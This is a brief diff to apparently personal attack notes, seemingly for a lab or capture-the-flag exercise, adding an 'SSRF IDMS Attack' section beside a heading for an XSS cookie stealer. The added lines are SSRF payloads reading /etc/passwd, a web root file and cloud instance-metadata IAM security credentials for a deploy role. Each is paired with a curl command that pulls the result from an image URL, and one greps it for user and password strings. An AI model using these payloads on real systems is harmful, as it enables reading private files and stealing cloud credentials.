@@ -40,6 +40,18 @@ http://169.254.169.254
 http://169.254.169.254/latest/user-data
 
 ### SSRF IDMS Attack
+file:///etc/passwd
+curl http://intern.falsimentis.com/images/Drew.jpg 
+
+file:///var/www/html/index.html
+	curl --silent http://intern.falsimentis.com/images/Drew.jpg | grep -iE "user|pass"
+
+http://169.254.169.254/latest/meta-data/iam/info
+	curl --silent http://intern.falsimentis.com/images/Drew.jpg | jq
+
+http://169.254.169.254/latest/meta-data/iam/security-credentials/falsimentis-deploy-role/
+	curl --silent http://intern.falsimentis.com/images/Drew.jpg | jq
+
 
 ## XSS 
 ### CookieStealer
